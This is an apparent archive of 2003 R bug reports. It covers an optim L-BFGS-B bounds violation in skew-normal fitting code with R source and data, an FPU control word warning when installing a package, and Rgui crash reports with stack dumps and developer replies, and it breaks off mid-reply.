sn.dev.gh: gradient=[1]    219013   -312643 441647332
[1] -1.3546  0.4645  3.1741
Error in fn(par, ...) : cp outside bounds

The code looks somewhat involved.. however, what it does is to set up 
ingredients to run the final statement:

opt<- optim(cp, fn=sn.dev, gr=sn.dev.gh, method="L-BFGS-B",
         lower=c(-rep(Inf,m),1e-10, -0.99527), 
	 upper=c(rep(Inf,m), Inf, 0.99527), 
	 control=list(iter.max=100, abs.tol=1e-5),
	 X=X, y=y, trace=TRUE, hessian=FALSE)

The above sequence stoped because the last component of vector cp
is  3.1741, which exceeds the bound 0.99527.

Notice that the problem occurs "with 0 probability", in the sense 
that
1. if you change some of the data below (in vector monica2), then it is
   most likely to run fine;
2. if you change the starting point, then again it  works;
   specifically I changed
     cp <- c(qr.coef(qrX,y), s, gamma1)
   to 
     cp <- c(-1.322168500,  0.373810085,  0.326283975)
   which differ by [1]  2.666e-10 -3.154e-10 -3.033e-10
   and it worked from the second starting vector;
sn.dev: (cp,dev)=[1] -1.3222  0.3738  0.3263 42.1824
sn.dev.gh: gradient=[1]  2.092  4.059 -4.039
sn.dev: (cp,dev)=[1]  -2.2611   0.2060   0.6266 686.3263
sn.dev.gh: gradient=[1] -1208.1 -5719.7  -287.1
sn.dev: (cp,dev)=[1] -1.3632  0.3665  0.3394 42.6260
sn.dev.gh: gradient=[1] -27.758   1.067  -4.431
sn.dev: (cp,dev)=[1] -1.3279  0.3728  0.3281 42.1705
sn.dev.gh: gradient=[1] -1.976  3.989 -4.090
sn.dev: (cp,dev)=[1] -1.3279  0.3667  0.3348 42.1461
sn.dev.gh: gradient=[1] -0.4494 -4.9931 -4.0685
sn.dev: (cp,dev)=[1] -1.3280  0.3671  0.3403 42.1219
sn.dev.gh: gradient=[1] -0.5089 -4.4250 -4.0727
sn.dev: (cp,dev)=[1] -1.3282  0.3686  0.3623 42.0268
sn.dev.gh: gradient=[1] -0.7684 -2.2082 -4.0932
sn.dev: (cp,dev)=[1] -1.3290  0.3748  0.4506 41.6734
sn.dev.gh: gradient=[1] -2.128  5.823 -4.226
sn.dev: (cp,dev)=[1]    -1.3341     0.3927     0.9953 25934.8747
sn.dev.gh: gradient=[1]    219013   -312642 441646067
sn.dev: (cp,dev)=[1] -1.3307  0.3808  0.6321 40.9462
sn.dev.gh: gradient=[1] -2.806  8.579 -4.256
sn.dev: (cp,dev)=[1] -1.3324  0.3867  0.8137 40.3288
<..snip..>
sn.dev: (cp,dev)=[1] -1.3505  0.4184  0.9953 35.7271
sn.dev.gh: gradient=[1]     12.18    -13.92 -13349.90
> opt
$par
[1] -1.3505  0.4184  0.9953

$value
[1] 35.73

$counts
function gradient 
      44       44 
      
$convergence
[1] 0
      
$message
 [1] "CONVERGENCE: REL_REDUCTION_OF_F <= FACTR*EPSMCH"
      

3. when I run the same code on my MS-windows 2000 laptop (R 1.7.0),
   again it runs fine.



Hope to have provided a complete description.  

With best regards,

Adelchi Azzalini  <azzalini@stat.unipd.it>
Dipart.Scienze Statistiche, Università di Padova, Italia
http://azzalini.stat.unipd.it/


#--------------------------------------------
# code which produced the above output, you can just source() it

rm(list=ls())

sn.dev <- function(cp, X, y, trace=FALSE)
{ # -2*logL for centred parameters  
  m <- ncol(X)
  if(abs(cp[length(cp)])> 0.99527) {print(cp); stop("cp outside bounds")}
  dp <- as.vector(cp.to.dp(cp))
  location <- X %*% as.matrix(dp[1:m])
  scale <- dp[m+1]
  # AVOID: logL <- sum(log(dsn(y,location,dp[m+1],dp[m+2])))
  z <- (y-location)/scale
  nlogL <- (length(y)*log(2.506628274631*scale) + 0.5*sum(z^2)
            - sum(zeta(0,dp[m+2]*z)))
  if(trace) {cat("sn.dev: (cp,dev)="); print(c(cp,2*nlogL))}
  return(2*nlogL) 
}

sn.dev.gh <- function(cp, X, y, trace=FALSE, hessian=FALSE)
{
  # computes gradient and hessian of dev=-2*logL for centred parameters 
  # (and observed information matrix);
  m  <- ncol(X)
  n  <- nrow(X)
  np <- m+2
  score <- rep(NA,np)
  info  <- matrix(NA,np,np)
  beta <- cp[1:m]
  sigma <- cp[m+1]
  gamma1 <- cp[m+2]
  lambda <- gamma1.to.lambda(gamma1)
  # dp<-cp.to.dp(c(beta,sigma,gamma1))
  # info.dp <- sn.info(dp,y)$info.dp
  mu <- as.vector(X %*% as.matrix(beta))
  d  <- y-mu
  r  <- d/sigma
  E.Z<- lambda*sqrt(2/(pi*(1+lambda^2)))
  s.Z<- sqrt(1-E.Z^2)
  z  <- E.Z+s.Z*r
  p1 <- as.vector(zeta(1,lambda*z))
  p2 <- as.vector(zeta(2,lambda*z))
  omega<- sigma/s.Z
  w    <- lambda*p1-E.Z
  DE.Z <- sqrt(2/pi)/(1+lambda^2)^1.5
  Ds.Z <- (-E.Z/s.Z)*DE.Z
  Dz   <- DE.Z + r*Ds.Z
  DDE.Z<- (-3)*E.Z/(1+lambda^2)^2
  DDs.Z<- -((DE.Z*s.Z-E.Z*Ds.Z)*DE.Z/s.Z^2+E.Z*DDE.Z/s.Z)
  DDz  <- DDE.Z + r*DDs.Z
  score[1:m] <- omega^(-2)*t(X) %*% as.matrix(y-mu-omega*w) 
  score[m+1] <- (-n)/sigma+s.Z*sum(d*(z-p1*lambda))/sigma^2
  score[m+2] <- score.l <- n*Ds.Z/s.Z-sum(z*Dz)+sum(p1*(z+lambda*Dz))
  Dg.Dl <-1.5*(4-pi)*E.Z^2*(DE.Z*s.Z-E.Z*Ds.Z)/s.Z^4
  R <- E.Z/s.Z
  T <- sqrt(2/pi-(1-2/pi)*R^2)
  Dl.Dg <- 2*(T/(T*R)^2+(1-2/pi)/T^3)/(3*(4-pi))
  R. <- 2/(3*R^2 * (4-pi))
  T. <- (-R)*R.*(1-2/pi)/T
  DDl.Dg <- (-2/(3*(4-pi))) * (T./(R*T)^2+2*R./(T*R^3)+3*(1-2/pi)*T./T^4)
  score[m+2] <- score[m+2]/Dg.Dl  # convert deriv wrt lamda to gamma1 
  gradient <- (-2)*score
  if(hessian){
     info[1:m,1:m] <- omega^(-2) * t(X) %*% ((1-lambda^2*p2)*X)
     info[1:m,m+1] <- info[m+1,1:m] <- 
            s.Z* t(X) %*% as.matrix((z-lambda*p1)+d*(1-lambda^2*p2)*
            s.Z/sigma)/sigma^2
     info[m+1,m+1] <- (-n)/sigma^2+2*s.Z*sum(d*(z-lambda*p1))/sigma^3 +
            s.Z^2*sum(d*(1-lambda^2*p2)*d)/sigma^4
     info[1:m,m+2] <- info[m+2,1:m] <- 
            t(X)%*%(-2*Ds.Z*d/omega+Ds.Z*w+s.Z*(p1+lambda*p2*(z+lambda*Dz)
            -DE.Z))/sigma 
     info[m+1,m+2] <- info[m+2,m+1] <- 
            -sum(d*(Ds.Z*(z-lambda*p1)+s.Z*(Dz-p1-p2*lambda*(z+lambda*Dz))
             ))/sigma^2
     info[m+2,m+2] <- (n*(-DDs.Z*s.Z+Ds.Z^2)/s.Z^2+sum(Dz^2+z*DDz)-
            sum(p2*(z+lambda*Dz)^2)- sum(p1*(2*Dz+lambda*DDz)))
     info[np,] <- info[np,]/Dg.Dl # convert info wrt lamda to gamma1 
     info[,np] <- info[,np]*Dl.Dg # an equivalent form of the above
     info[np,np] <- info[np,np]-score.l*DDl.Dg
     }
  attr(gradient,"hessian") <- 2*info
  if(trace) {cat("sn.dev.gh: gradient="); print(-2*score)}
  return(gradient)
}

cp.to.dp <- function(param){
  # converts centred parameters cp=(mu,sigma,gamma1)
  # to direct parameters dp=(xi,omega,lambda)
  # Note:  mu can be m-dimensional, the other must be scalars
  b <- sqrt(2/pi)
  m <- length(param)-2
  gamma1 <- param[m+2]
  if(abs(gamma1)>0.9952719) stop("abs(gamma1)>0.9952719 ")
  A <- sign(gamma1)*(abs(2*gamma1/(4-pi)))^(1/3)
  delta <- A/(b*sqrt(1+A^2))
  lambda <- delta/sqrt(1-delta^2)
  E.Z  <- b*delta
  sd.Z <- sqrt(1-E.Z^2)
  location    <- param[1:m]
  location[1] <- param[1]-param[m+1]*E.Z/sd.Z
  scale <- param[m+1]/sd.Z
  dp    <- c(location,scale,lambda)
  names(dp)[(m+1):(m+2)] <- c("scale","shape")
  if(m==1)  names(dp)[1] <- "location"
  dp
  }

zeta <- function(k,x){# k integer \in (0,4)
  k <- as.integer(k)
  na <- is.na(x)
  x <- replace(x,na,0)
  if(any(abs(x)==Inf)) stop("Inf not allowed")
  # funzionerebbe per k=0 e 1, ma non per k>1
  ok <- (-35<x)
  if(k>2 & sum(!ok)>0) na<- (na | x < (-35))
  if(k==0)  
    {ax <- (-x[!ok])
    ay  <- (-0.918938533204673)-0.5*ax^2-log(ax)
    y   <- rep(NA,length(x))
    y[ok] <- log(2*pnorm(x[ok]))
    y[!ok]<- ay
    }
  else {if(k==1) {y  <- (-x)*(1+1/x^2)
          y[ok]<-dnorm(x[ok])/pnorm(x[ok]) }
    else { if(k==2)  y<-(-zeta(1,x)*(x+zeta(1,x)))
      else{ if(k==3)  y<-(-zeta(2,x)*(x+zeta(1,x))-zeta(1,x)*(1+zeta(2,x)))
        else{ if(k==4)  
           y<-(-zeta(3,x)*(x+2*zeta(1,x))-2*zeta(2,x)*(1+zeta(2,x)))
        else stop("k must be integer in (0,4)") }}}}
  replace(y,na,NA)
}

gamma1.to.lambda<- function(gamma1){
  max.gamma1 <- 0.5*(4-pi)*(2/(pi-2))^1.5
  na <- (abs(gamma1)>max.gamma1)
  if(any(na)) warning("NAs generated") 
  gamma1<-replace(gamma1,na,NA)
  a    <- sign(gamma1)*(2*abs(gamma1)/(4-pi))^0.33333
  delta<- sqrt(pi/2)*a/sqrt(1+a^2)
  lambda<-delta/sqrt(1-delta^2)
  as.vector(lambda)
}

monica2 <-  structure(c(-1.13886379255452, -1.49413719201167, -1.87841064955904, 
-0.513738594928947, -1.00896950224601, -1.6532307897784, -1.30938967543405, 
-1.06041025293133, -1.81471688461199, -1.33766295196981, -1.64330728995432, 
-1.06469899752166, -1.00001063084463, -1.39630202884595, -0.69585045438959, 
-1.69203796703315, -1.52865988854611, -1.62709073708234, -0.934436685805195, 
-1.11123590657362, -1.67332502980791, -1.16134216754217, -1.27483304830845, 
-1.83766242751329, -1.56429386551254, -0.70663591112117, -0.806879736670856, 
-1.39706539761330, -1.48444503984765, -1.48192041745309, -0.763350185813698, 
-1.42340943250413, -1.5034850496403, -0.916057843936642, -0.797650717731944, 
-1.90218776624194, -1.89573584905280, -1.55031254908193, -1.55488970245028, 
-1.17137569123985, -1.81490209565657, -1.82974300222698, -0.797407302025425, 
-1.16514651844490, -1.31007112485982, -1.71325589588157, -1.54253707834837, 
-1.28190616471927, -1.28990272862791, -0.593534374170964),
          parameters = c(-1.71631422551004, 0.5, 2))

#----
# cp <- c(-1.322168500,  0.373810085,  0.326283975)
y <- monica2
X <-  matrix(1, nrow=length(monica2))
n <- length(y)
m <- ncol(X)
    qrX <- qr(X)
    s <- sqrt(sum(qr.resid(qrX, y)^2)/n)
    gamma1 <- sum(qr.resid(qrX, y)^3)/(n*s^3)
    if(abs(gamma1)>0.99527) gamma1<- sign(gamma1)*0.95
    cp <- c(qr.coef(qrX,y), s, gamma1)
opt<- optim(cp, fn=sn.dev, gr=sn.dev.gh, method="L-BFGS-B",
         lower=c(-rep(Inf,m),1e-10, -0.99527), 
         upper=c(rep(Inf,m), Inf, 0.99527), 
         control=list(iter.max=100, abs.tol=1e-5),
         X=X, y=y, trace=TRUE, hessian=FALSE)

		  

--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = 
 major = 1
 minor = 7.0
 year = 2003
 month = 04
 day = 16
 language = R

Search Path:
 .GlobalEnv, package:methods, package:ctest, package:mva, package:modreg, package:nls, package:ts, file:/home/aa/SW/R-misc/local-def.save, Autoloads, package:base

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3394 *
Subject: bug? exactRankTests install anomaly
From: mwgrant@adelphia.net
Date: Fri, 4 Jul 2003 04:04:12 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3394 <==
From mwgrant@adelphia.net Fri Jul  4 04:04:12 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h6424CJH001004
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 04:04:12 +0200 (MET DST)
Date: Fri, 4 Jul 2003 04:04:12 +0200 (MET DST)
Message-Id: <200307040204.h6424CJH001004@pubhealth.ku.dk>
From: mwgrant@adelphia.net
To: R-bugs@biostat.ku.dk
Subject: bug? exactRankTests install anomaly

Full_Name: Michael W. Grant
Version: 1.7.1(2003-06-16)
OS: Windows 98 Second Edition 4.10.2222 A
Submission from: (NULL) (24.55.165.101)


I just installed version 1.7.1 tonight. In the process I installed via CRAN from
the menu several packages. One installation, exactRankTests, had a distinct
anomaly. A DLL attempt to change FPU control word as seem in the last line  of
the following listing:

START LISTING:

> install.packages(choose.files('',filters=Filters[c('zip','All'),]),
.libPaths()[1], CRAN = NULL)
> local({a <- CRAN.packages()
+ install.packages(select.list(a[,1],,TRUE), .libPaths()[1], available=a)})
trying URL `http://cran.r-project.org/bin/windows/contrib/1.7/PACKAGES'
Content type `text/plain; charset=iso-8859-1' length 11106 bytes
opened URL
downloaded 10Kb

trying URL `http://cran.r-project.org/bin/windows/contrib/1.7/exactRankTests_0.8-1.zip'
Content type `application/zip' length 168784 bytes
opened URL
downloaded 164Kb


Delete downloaded files (y/N)? y

updating HTML package descriptions
Warning message: 
DLL attempted to change FPU control word from 8001f to 9001f 
> 
END LISTING


NOTEs
1.) this installation was done immediately after starting Rgui, i.e., Rgui was
launched, "Packages" dropdown clicked, "Install packages from CRAN..." clicked

2.) subsequently several other packages installed without incident.

3.) R was killed, restarted, and the installation done again and the same
DLL/FPU anomaly occurred.

Best regards

==> 3394.followup.1 <==
From dmurdoch@pair.com Fri Jul  4 04:44:55 2003
Received: from tomts5-srv.bellnexxia.net (tomts5.bellnexxia.net [209.226.175.25])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h642isJH001182
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 04:44:55 +0200 (MET DST)
Received: from djmfuj ([65.93.71.199]) by tomts5-srv.bellnexxia.net
          (InterMail vM.5.01.05.32 201-253-122-126-132-20030307) with SMTP
          id <20030704024453.YLDK3524.tomts5-srv.bellnexxia.net@djmfuj>;
          Thu, 3 Jul 2003 22:44:53 -0400
From: Duncan Murdoch <dmurdoch@pair.com>
To: mwgrant@adelphia.net
Cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] bug? exactRankTests install anomaly (PR#3394)
Date: Thu, 03 Jul 2003 22:45:05 -0400
Message-ID: <l8q9gvcbkpgr422omt7afqbdkg234s1uc1@4ax.com>
References: <200307040204.h6424DJH001008@pubhealth.ku.dk>
In-Reply-To: <200307040204.h6424DJH001008@pubhealth.ku.dk>
X-Mailer: Forte Agent 1.91/32.564
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

On Fri, 4 Jul 2003 04:04:13 +0200 (MET DST), you wrote:

>Full_Name: Michael W. Grant
>Version: 1.7.1(2003-06-16)
>OS: Windows 98 Second Edition 4.10.2222 A
>Submission from: (NULL) (24.55.165.101)
>
>
>I just installed version 1.7.1 tonight. In the process I installed via CRAN from
>the menu several packages. One installation, exactRankTests, had a distinct
>anomaly. A DLL attempt to change FPU control word as seem in the last line  of
>the following listing:

That is not likely a bug in R, it's a bug in some other software on
your system, which has changed the floating point precision.  It's
hard to track down exactly what program did this, and hard to fix.
The general strategy for tracking it down is to find the minimal
operation that does it (e.g. does it depend on which package you
install?  Do you get it from a local install instead of a remote
download + install, etc.)

If you set options(warn.FPU=TRUE) then you'll see the warning more
often; without that option, it is suppressed.  

Duncan Murdoch
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3399 *
Subject: R crashes when installing package from CRAN
From: renaud.lancelot@cirad.fr
Date: Fri, 4 Jul 2003 14:17:52 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3399 <==
From renaud.lancelot@cirad.fr Fri Jul  4 14:18:08 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h64CHqJH006905
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 14:18:07 +0200 (MET DST)
Date: Fri, 4 Jul 2003 14:17:52 +0200 (MET DST)
Message-Id: <200307041218.h64CHqJH006905@pubhealth.ku.dk>
From: renaud.lancelot@cirad.fr
To: R-bugs@biostat.ku.dk
Subject: R crashes when installing package from CRAN

Full_Name: Renaud Lancelot
Version: 1.7.1.
OS: MS Windows XP Pro
Submission from: (NULL) (213.154.92.224)


R crashes when installing package from CRAN (from the menu). The bug seems to be
reproducible, at least on my system:

1. Open R
2. Install package from CRAN: install 1 package
3. Back to R: delete file ("y" at the prompt) and wait till package is fully
installed
4. Go back to the menu "Install package from CRAN" then R crashes

Here are 3 reports generated by DrMingw:

########## 1.

Rgui.exe caused an Access Violation at location 005b9067 in module R.dll Reading
from location 14c1eff0.

Registers:
eax=0518a970 ebx=00c09fd0 ecx=00780000 edx=a2010465 esi=04f678f4 edi=052d607c
eip=005b9067 esp=0022de64 ebp=0022de74 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000202

Call stack:
005B9067  R.dll:005B9067  fillrect
005B5CB0  R.dll:005B5CB0  clear
005BB289  R.dll:005BB289  gprintf
005BB622  R.dll:005BB622  gprintf
005BB839  R.dll:005BB839  app_win_proc@16
77D37AD7  USER32.dll:77D37AD7  SetWindowPlacement
77D3CCD4  USER32.dll:77D3CCD4  DefRawInputProc
77D145BD  USER32.dll:77D145BD  TranslateMessageEx
77D147D4  USER32.dll:77D147D4  DefWindowProcA
77F65DA3  ntdll.dll:77F65DA3  KiUserCallbackDispatcher
005B602F  R.dll:005B602F  show
00477CD5  R.dll:00477CD5  do_selectlist
00509CB4  R.dll:00509CB4  do_internal
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DA716  R.dll:004DA716  Rf_eval
004DA65E  R.dll:004DA65E  Rf_eval
004DCBBB  R.dll:004DCBBB  Rf_evalList
004DA910  R.dll:004DA910  Rf_eval
004DCBBB  R.dll:004DCBBB  Rf_evalList
004DA910  R.dll:004DA910  Rf_eval
004DB75C  R.dll:004DB75C  do_if
004DA9E8  R.dll:004DA9E8  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DD315  R.dll:004DD315  do_eval
00509CB4  R.dll:00509CB4  do_internal
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DD315  R.dll:004DD315  do_eval
00509CB4  R.dll:00509CB4  do_internal
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004FA06E  R.dll:004FA06E  Rf_ReplIteration
004FA672  R.dll:004FA672  Rf_ReplIteration
004FB176  R.dll:004FB176  run_Rmainloop
00401407  Rgui.exe:00401407
0040134E  Rgui.exe:0040134E
00401523  Rgui.exe:00401523
00401170  Rgui.exe:00401170
00401013  Rgui.exe:00401013
77E614C7  kernel32.dll:77E614C7  GetCurrentDirectoryW


############# 2

Rgui.exe caused an Access Violation at location 005b5845 in module R.dll Writing
to location 0000002a.

Registers:
eax=0000002a ebx=0153a81c ecx=0062f8e0 edx=00000000 esi=0022e028 edi=000e038e
eip=005b5845 esp=0022e008 ebp=0022e010 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000202

Call stack:
005B5845  R.dll:005B5845  drawto
005BB289  R.dll:005BB289  gprintf
005BB622  R.dll:005BB622  gprintf
005BB894  R.dll:005BB894  app_doc_proc@16
77D37AD7  USER32.dll:77D37AD7  SetWindowPlacement
77D3CCD4  USER32.dll:77D3CCD4  DefRawInputProc
77D145BD  USER32.dll:77D145BD  TranslateMessageEx
77D147D4  USER32.dll:77D147D4  DefWindowProcA
77F65DA3  ntdll.dll:77F65DA3  KiUserCallbackDispatcher
77D14D58  USER32.dll:77D14D58  DispatchMessageA
00480A83  R.dll:00480A83  R_ProcessEvents
004DAA78  R.dll:004DAA78  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DA9E8  R.dll:004DA9E8  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DC9D5  R.dll:004DC9D5  do_set
004DA9E8  R.dll:004DA9E8  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DD315  R.dll:004DD315  do_eval
00509CB4  R.dll:00509CB4  do_internal
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DD315  R.dll:004DD315  do_eval
00509CB4  R.dll:00509CB4  do_internal
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004FA06E  R.dll:004FA06E  Rf_ReplIteration
004FA672  R.dll:004FA672  Rf_ReplIteration
004FB176  R.dll:004FB176  run_Rmainloop
00401407  Rgui.exe:00401407
0040134E  Rgui.exe:0040134E
00401523  Rgui.exe:00401523
00401170  Rgui.exe:00401170
00401013  Rgui.exe:00401013
77E614C7  kernel32.dll:77E614C7  GetCurrentDirectoryW


################# 3

Rgui.exe caused an Access Violation at location 005b5845 in module R.dll Writing
to location 000000b5.

Registers:
eax=000000b5 ebx=01b2508c ecx=0062f8e0 edx=00000000 esi=0022e028 edi=000503fa
eip=005b5845 esp=0022e008 ebp=0022e010 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000202

Call stack:
005B5845  R.dll:005B5845  drawto
005BB289  R.dll:005BB289  gprintf
005BB622  R.dll:005BB622  gprintf
005BB894  R.dll:005BB894  app_doc_proc@16
77D37AD7  USER32.dll:77D37AD7  SetWindowPlacement
77D3CCD4  USER32.dll:77D3CCD4  DefRawInputProc
77D145BD  USER32.dll:77D145BD  TranslateMessageEx
77D147D4  USER32.dll:77D147D4  DefWindowProcA
77F65DA3  ntdll.dll:77F65DA3  KiUserCallbackDispatcher
77D14D58  USER32.dll:77D14D58  DispatchMessageA
00480A83  R.dll:00480A83  R_ProcessEvents
004DAA78  R.dll:004DAA78  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DA9E8  R.dll:004DA9E8  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DC9D5  R.dll:004DC9D5  do_set
004DA9E8  R.dll:004DA9E8  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DD315  R.dll:004DD315  do_eval
00509CB4  R.dll:00509CB4  do_internal
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DD315  R.dll:004DD315  do_eval
00509CB4  R.dll:00509CB4  do_internal
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DC0D2  R.dll:004DC0D2  do_begin
004DA9E8  R.dll:004DA9E8  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004DACD5  R.dll:004DACD5  Rf_applyClosure
004DA7F7  R.dll:004DA7F7  Rf_eval
004FA06E  R.dll:004FA06E  Rf_ReplIteration
004FA672  R.dll:004FA672  Rf_ReplIteration
004FB176  R.dll:004FB176  run_Rmainloop
00401407  Rgui.exe:00401407
0040134E  Rgui.exe:0040134E
00401523  Rgui.exe:00401523
00401170  Rgui.exe:00401170
00401013  Rgui.exe:00401013
77E614C7  kernel32.dll:77E614C7  GetCurrentDirectoryW


==> 3399.followup.1 <==
From dmurdoch@pair.com Fri Jul  4 14:32:53 2003
Received: from tomts11-srv.bellnexxia.net (tomts11.bellnexxia.net [209.226.175.55])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h64CWpJH007117
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 14:32:52 +0200 (MET DST)
Received: from djmfuj ([65.93.71.199]) by tomts11-srv.bellnexxia.net
          (InterMail vM.5.01.05.32 201-253-122-126-132-20030307) with SMTP
          id <20030704123251.ZMI19558.tomts11-srv.bellnexxia.net@djmfuj>;
          Fri, 4 Jul 2003 08:32:51 -0400
From: Duncan Murdoch <dmurdoch@pair.com>
To: renaud.lancelot@cirad.fr
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] R crashes when installing package from CRAN (PR#3399)
Date: Fri, 04 Jul 2003 08:33:02 -0400
Message-ID: <nrsagv04mh7f2701sq2ai3grvvg0hlfvmk@4ax.com>
References: <200307041218.h64CI8JH006911@pubhealth.ku.dk>
In-Reply-To: <200307041218.h64CI8JH006911@pubhealth.ku.dk>
X-Mailer: Forte Agent 1.91/32.564
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

On Fri, 4 Jul 2003 14:18:08 +0200 (MET DST), you wrote:

>Full_Name: Renaud Lancelot
>Version: 1.7.1.
>OS: MS Windows XP Pro
>Submission from: (NULL) (213.154.92.224)
>
>
>R crashes when installing package from CRAN (from the menu). The bug seems to be
>reproducible, at least on my system:
>
>1. Open R
>2. Install package from CRAN: install 1 package
>3. Back to R: delete file ("y" at the prompt) and wait till package is fully
>installed
>4. Go back to the menu "Install package from CRAN" then R crashes

This isn't reproducible on my system, also running XP Pro.  Can you
reproduce on a different machine?

Duncan Murdoch

==> 3399.followup.2 <==
From renaud.lancelot@cirad.fr Fri Jul  4 19:43:43 2003
Received: from mailrelay.sonatel.sn ([213.154.64.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h64HheJH009355
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 19:43:41 +0200 (MET DST)
Received: (qmail 23923 invoked from network); 4 Jul 2003 17:44:39 -0000
Received: from unknown (HELO cirad.fr) (213.154.93.58)
  by mailrelay.sentoo.sn with SMTP; 4 Jul 2003 17:44:39 -0000
Message-ID: <3F05BCC6.6080105@cirad.fr>
Date: Fri, 04 Jul 2003 17:43:34 +0000
From: Renaud Lancelot <renaud.lancelot@cirad.fr>
Reply-To: renaud.lancelot@cirad.fr
Organization: CIRAD
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.2.1) Gecko/20021130
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Duncan Murdoch <dmurdoch@pair.com>
CC: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] R crashes when installing package from CRAN (PR#3399)
References: <200307041218.h64CI8JH006911@pubhealth.ku.dk> <nrsagv04mh7f2701sq2ai3grvvg0hlfvmk@4ax.com>
In-Reply-To: <nrsagv04mh7f2701sq2ai3grvvg0hlfvmk@4ax.com>
Content-Type: text/plain; charset=ISO-8859-1; format=flowed
Content-Transfer-Encoding: 8bit

Duncan Murdoch wrote:
> On Fri, 4 Jul 2003 14:18:08 +0200 (MET DST), you wrote:
> 
> 
>>Full_Name: Renaud Lancelot
>>Version: 1.7.1.
>>OS: MS Windows XP Pro
>>Submission from: (NULL) (213.154.92.224)
>>
>>
